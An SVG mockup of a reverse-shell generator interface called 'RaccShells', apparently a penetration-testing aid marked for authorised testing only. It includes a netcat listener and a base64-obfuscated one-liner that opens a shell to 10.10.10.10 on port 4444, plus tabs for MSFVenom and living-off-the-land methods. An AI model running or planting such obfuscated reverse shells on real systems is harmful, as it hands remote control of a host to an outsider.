<svg viewBox="0 0 820 480" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New', Consolas, monospace">
  <defs>
    <pattern id="scanlines" x="0" y="0" width="1" height="4" patternUnits="userSpaceOnUse">
      <rect width="1" height="2" fill="rgba(0,255,0,0.012)"/>
    </pattern>
    <filter id="glow">
      <feGaussianBlur stdDeviation="2" result="b"/>
      <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <!-- Background -->
  <rect width="820" height="480" fill="#0a0a0a" rx="8"/>
  <rect width="820" height="480" fill="url(#scanlines)" rx="8" opacity="0.6"/>

  <!-- Window chrome -->
  <rect width="820" height="28" fill="#0d0d0d" rx="8"/>
  <rect y="14" width="820" height="14" fill="#0d0d0d"/>
  <circle cx="18" cy="14" r="5" fill="#ff5f57"/>
  <circle cx="34" cy="14" r="5" fill="#ffbd2e"/>
  <circle cx="50" cy="14" r="5" fill="#28ca41"/>
  <text x="410" y="19" text-anchor="middle" font-size="10" fill="#333" letter-spacing="1">RaccShells — Reverse Shell Generator</text>

  <!-- Config panel -->
  <rect x="12" y="36" width="796" height="110" rx="5" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>

  <!-- Field labels -->
  <text x="24" y="56" font-size="9" fill="#444" letter-spacing="1">▸ LHOST / IP</text>
  <rect x="24" y="60" width="170" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="34" y="76" font-size="11" fill="#c0ffc0">10.10.10.10</text>

  <text x="210" y="56" font-size="9" fill="#444" letter-spacing="1">▸ PORT</text>
  <rect x="210" y="60" width="110" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="220" y="76" font-size="11" fill="#c0ffc0">4444</text>

  <text x="336" y="56" font-size="9" fill="#444" letter-spacing="1">▸ SHELL</text>
  <rect x="336" y="60" width="150" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="346" y="76" font-size="11" fill="#c0ffc0">/bin/bash</text>
  <text x="474" y="76" font-size="9" fill="#333">▾</text>

  <text x="502" y="56" font-size="9" fill="#444" letter-spacing="1">▸ LISTENER</text>
  <rect x="502" y="60" width="160" height="24" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="512" y="76" font-size="11" fill="#c0ffc0">Netcat (nc)</text>
  <text x="650" y="76" font-size="9" fill="#333">▾</text>

  <!-- Listener cmd box -->
  <rect x="24" y="100" width="780" height="36" rx="3" fill="#050f05" stroke="#0d2a0d" stroke-width="1"/>
  <text x="34" y="114" font-size="9" fill="#444" letter-spacing="1">▸ LISTENER:</text>
  <text x="118" y="114" font-size="11" fill="#00ff00" filter="url(#glow)">nc -lvnp 4444</text>
  <rect x="766" y="103" width="30" height="16" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="781" y="115" text-anchor="middle" font-size="8" fill="#555">copy</text>
  <text x="34" y="128" font-size="8" fill="#2a5a2a" letter-spacing="0.5">rlwrap nc -lvnp 4444  |  pwncat-cs -lp 4444  |  pwncat -l -p 4444</text>

  <!-- Search bar -->
  <rect x="12" y="156" width="796" height="28" rx="3" fill="#0a0a0a" stroke="#1a3a1a" stroke-width="1"/>
  <text x="24" y="174" font-size="11" fill="#333">/ search shells...</text>

  <!-- Filter chips -->
  <text x="12" y="204" font-size="9" fill="#333" letter-spacing="1">FILTER:</text>

  <!-- linux chip -->
  <rect x="66" y="192" width="52" height="18" rx="9" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="92" y="205" text-anchor="middle" font-size="9" fill="#f0c060">◆ linux</text>

  <!-- mac chip -->
  <rect x="124" y="192" width="44" height="18" rx="9" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="146" y="205" text-anchor="middle" font-size="9" fill="#60c0f0">◆ mac</text>

  <!-- windows chip (active) -->
  <rect x="174" y="192" width="66" height="18" rx="9" fill="#140020" stroke="#4a1070" stroke-width="1"/>
  <text x="207" y="205" text-anchor="middle" font-size="9" fill="#a060f0">◆ windows</text>

  <!-- encrypted chip -->
  <rect x="246" y="192" width="76" height="18" rx="9" fill="#1a1200" stroke="#604a00" stroke-width="1"/>
  <text x="284" y="205" text-anchor="middle" font-size="9" fill="#e0c030">🔒 encrypted</text>

  <!-- obf chip -->
  <rect x="328" y="192" width="90" height="18" rx="9" fill="#141a00" stroke="#667700" stroke-width="1"/>
  <text x="373" y="205" text-anchor="middle" font-size="9" fill="#ccdd00">▶ obfuscatable</text>

  <!-- Tabs -->
  <!-- Active tab -->
  <rect x="12" y="220" width="112" height="24" rx="4 4 0 0" fill="#0d1a0d" stroke="#1a5a1a" stroke-width="1"/>
  <text x="68" y="236" text-anchor="middle" font-size="9" fill="#00ff00" letter-spacing="0.5">► Reverse Shells</text>

  <rect x="126" y="223" width="90" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="171" y="237" text-anchor="middle" font-size="9" fill="#555">► Bind Shells</text>

  <rect x="218" y="223" width="82" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="259" y="237" text-anchor="middle" font-size="9" fill="#555">► MSFVenom</text>

  <rect x="302" y="223" width="90" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="347" y="237" text-anchor="middle" font-size="9" fill="#555">► Shell Upgrade</text>

  <rect x="394" y="223" width="106" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="447" y="237" text-anchor="middle" font-size="9" fill="#555">► Tools &amp; Listeners</text>

  <rect x="502" y="223" width="130" height="21" rx="4 4 0 0" fill="#0d0d0d" stroke="#1a3a1a" stroke-width="1"/>
  <text x="567" y="237" text-anchor="middle" font-size="9" fill="#555">► Living off the Land</text>

  <!-- Tab content area -->
  <rect x="12" y="244" width="796" height="222" rx="0 4 4 4" fill="#0d1a0d" stroke="#1a5a1a" stroke-width="1"/>

  <!-- Shell count -->
  <text x="24" y="262" font-size="9" fill="#444" letter-spacing="1">Showing <tspan fill="#00cc00">72</tspan> reverse shells</text>

  <!-- Shell item 1 — Bash TCP (open) -->
  <rect x="22" y="270" width="780" height="86" rx="3" fill="#060f06" stroke="#2a5a2a" stroke-width="1"/>
  <rect x="22" y="270" width="780" height="28" rx="3 3 0 0" fill="#060f06"/>
  <text x="34" y="288" font-size="10" fill="#00cc00" font-weight="bold">Bash TCP</text>
  <!-- badges -->
  <rect x="108" y="278" width="36" height="14" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="126" y="289" text-anchor="middle" font-size="8" fill="#f0c060">linux</text>
  <rect x="150" y="278" width="32" height="14" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="166" y="289" text-anchor="middle" font-size="8" fill="#60c0f0">mac</text>
  <!-- obf btn -->
  <rect x="688" y="279" width="44" height="14" rx="2" fill="#1a1200" stroke="#cc9900" stroke-width="1"/>
  <text x="710" y="290" text-anchor="middle" font-size="8" fill="#e0b030">◈ base64</text>
  <!-- copy btn -->
  <rect x="738" y="279" width="54" height="14" rx="2" fill="transparent" stroke="#00cc00" stroke-width="1"/>
  <text x="765" y="290" text-anchor="middle" font-size="8" fill="#00cc00">copy</text>

  <!-- obf mode bar -->
  <rect x="34" y="300" width="40" height="13" rx="6" fill="#141a00" stroke="#889900" stroke-width="1"/>
  <text x="54" y="310" text-anchor="middle" font-size="7.5" fill="#445500">plain</text>
  <rect x="80" y="300" width="46" height="13" rx="6" fill="#141a00" stroke="#889900" stroke-width="1"/>
  <text x="103" y="310" text-anchor="middle" font-size="7.5" fill="#ccdd00">base64</text>
  <rect x="132" y="300" width="56" height="13" rx="6" fill="#0a0a0a" stroke="#1a2a00" stroke-width="1"/>
  <text x="160" y="310" text-anchor="middle" font-size="7.5" fill="#444">$var split</text>
  <rect x="194" y="300" width="62" height="13" rx="6" fill="#0a0a0a" stroke="#1a2a00" stroke-width="1"/>
  <text x="225" y="310" text-anchor="middle" font-size="7.5" fill="#444">hex printf</text>

  <!-- code block -->
  <rect x="24" y="316" width="776" height="20" rx="2" fill="#030803" stroke="#0d2a0d" stroke-width="1"/>
  <text x="34" y="330" font-size="9.5" fill="#a0f0a0" font-family="'Courier New',monospace">
    <tspan fill="#00ff88">bash</tspan>
    <tspan fill="#aaaaaa"> -c </tspan>
    <tspan fill="#f0a070">"$(echo </tspan>
    <tspan fill="#f0a070">'enNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEwLzQ0NDQgMD4mMQ=='</tspan>
    <tspan fill="#f0a070">|</tspan>
    <tspan fill="#79b8ff">base64</tspan>
    <tspan fill="#79b8ff"> -d</tspan>
    <tspan fill="#f0a070">)"</tspan>
  </text>

  <!-- SVG diagram strip -->
  <rect x="24" y="338" width="776" height="28" rx="2" fill="#030a03" stroke="#0d2a0d" stroke-width="1"/>
  <!-- mini diagram: attacker laptop -->
  <rect x="40" y="342" width="36" height="20" rx="2" fill="#080808" stroke="#4488ff" stroke-width="1"/>
  <rect x="43" y="345" width="30" height="13" rx="1" fill="#00091a"/>
  <text x="58" y="367" text-anchor="middle" font-size="6" fill="#4488ff">ATTACKER</text>
  <!-- arrow right (connect) -->
  <line x1="210" y1="350" x2="140" y2="350" stroke="#4488ff" stroke-width="1.2" marker-end="url(#arr)"/>
  <text x="175" y="347" text-anchor="middle" font-size="6" fill="#4477cc">① TCP connect</text>
  <!-- arrow left (cmd dashed) -->
  <line x1="140" y1="355" x2="210" y2="355" stroke="#ff4444" stroke-width="1" stroke-dasharray="3,2"/>
  <text x="175" y="362" text-anchor="middle" font-size="6" fill="#cc4444">② cmd / ③ output</text>
  <!-- victim laptop -->
  <rect x="224" y="342" width="36" height="20" rx="2" fill="#080808" stroke="#ff4444" stroke-width="1"/>
  <rect x="227" y="345" width="30" height="13" rx="1" fill="#1a0000"/>
  <text x="242" y="367" text-anchor="middle" font-size="6" fill="#ff4444">VICTIM</text>

  <!-- Shell item 2 — collapsed -->
  <rect x="22" y="362" width="780" height="24" rx="3" fill="#060f06" stroke="#1a3a1a" stroke-width="1"/>
  <text x="34" y="378" font-size="10" fill="#00cc00" font-weight="bold">Python3 #1</text>
  <rect x="132" y="371" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="150" y="381" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="174" y="371" width="32" height="13" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="190" y="381" text-anchor="middle" font-size="7.5" fill="#60c0f0">mac</text>
  <rect x="738" y="371" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="381" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- Shell item 3 — collapsed -->
  <rect x="22" y="392" width="780" height="24" rx="3" fill="#060f06" stroke="#1a3a1a" stroke-width="1"/>
  <text x="34" y="408" font-size="10" fill="#00cc00" font-weight="bold">Perl</text>
  <rect x="72" y="401" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="90" y="411" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="114" y="401" width="32" height="13" rx="2" fill="#001620" stroke="#105a70" stroke-width="1"/>
  <text x="130" y="411" text-anchor="middle" font-size="7.5" fill="#60c0f0">mac</text>
  <rect x="738" y="401" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="411" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- Shell item 4 — encrypted (gold) -->
  <rect x="22" y="422" width="780" height="24" rx="3" fill="#060f06" stroke="#3a3010" stroke-width="1"/>
  <rect x="22" y="422" width="780" height="24" rx="3" fill="rgba(58,48,16,0.3)"/>
  <text x="34" y="438" font-size="10" fill="#00cc00" font-weight="bold">OpenSSL</text>
  <rect x="98" y="431" width="36" height="13" rx="2" fill="#1a1600" stroke="#5a4a10" stroke-width="1"/>
  <text x="116" y="441" text-anchor="middle" font-size="7.5" fill="#f0c060">linux</text>
  <rect x="140" y="431" width="50" height="13" rx="2" fill="#1a1200" stroke="#604a00" stroke-width="1"/>
  <text x="165" y="441" text-anchor="middle" font-size="7.5" fill="#e0c030">🔒 enc</text>
  <rect x="738" y="431" width="54" height="13" rx="2" fill="transparent" stroke="#1a4a1a" stroke-width="1"/>
  <text x="765" y="441" text-anchor="middle" font-size="7.5" fill="#555">copy</text>

  <!-- footer -->
  <text x="410" y="472" text-anchor="middle" font-size="8" fill="#222" letter-spacing="2">@BENJITRAPP  |  FOR AUTHORISED TESTING ONLY</text>

</svg>
